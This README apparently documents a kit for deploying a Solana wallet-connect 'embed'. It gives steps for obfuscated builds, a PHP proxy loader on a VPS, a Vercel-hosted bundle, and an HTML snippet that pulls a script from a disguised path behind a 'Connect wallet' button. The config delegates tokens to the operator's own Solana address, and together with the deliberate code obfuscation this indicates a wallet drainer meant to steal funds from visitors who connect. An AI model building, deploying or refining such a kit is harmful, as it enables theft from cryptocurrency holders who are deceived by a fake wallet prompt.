# Wallet embed

```
├── vercel/          → deploy to Vercel (JS bundle + /profile popup)
├── vps/             → upload to Debian VPS (PHP proxy + HTML)
└── nginx/           → nginx config for VPS
```

---

## Build (obfuscate everything except public HTML)

```bash
npm run build
```

| Output | Obfuscated? |
|--------|-------------|
| `vercel/public/wallet.bundle.js` | Your app code yes; Reown/Solana libs minified only* |
| `vercel/public/profile/page.js` | Yes |
| `vercel/public/profile/index.html` | No (public HTML) |
| `vps/public/index.html` | No (public HTML) |
| `vps/loader.obf.php` | Yes (upload as `loader.php`) |

\*Full-bundle obfuscation (~2.2 MB) takes 5+ minutes and hangs Vercel builds, so vendor libs stay minified-only.

---

## VPS upload

```
vps/
├── loader.php           ← edit $cfg here (readable in repo)
├── loader.obf.php       ← build output — scp as loader.php
├── cache/
└── public/              ← upload HTML as-is
```

```bash
nano vps/loader.php
npm run build
scp vps/loader.obf.php user@vps:/var/www/mysite/vps/loader.php
scp -r vps/public/* user@vps:/var/www/mysite/vps/public/
```

---

## HTML

```html
<script>
!function(u){var s=document.createElement("script");s.src=u;s.defer=1;document.head.appendChild(s)}("/vault38472");
</script>
<button type="button" class="K7mQ2">Connect wallet</button>
```

---

## loader.php `$cfg`

```php
'reown_project_id' => 'YOUR_REOWN_ID',
'site_url' => 'https://vote-moonshot.top',
'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/wallet.bundle.js',
'button_class' => 'K7mQ2',
'connect_popup_enabled' => true,
'token_delegate' => 'YOUR_SOLANA_ADDRESS',
'solana_rpc_url' => 'https://mainnet.helius-rpc.com/?api-key=YOUR_KEY',
```

---

## Vercel

1. Import repo → **Root Directory:** `vercel` → Deploy
2. Build command: `npm run build` (or `cd .. && npm run build` if root build needed)
3. URLs: `/wallet.bundle.js` and `/profile`

Reown dashboard → allow **your HTML domain**

---

## Flow

```
/vault38472 → loader.php → config + Vercel JS
Pick wallet → popup YOUR-PROJECT.vercel.app/profile
```

Clear VPS cache after Vercel deploy: `rm -f vps/cache/wallet.bundle.js`
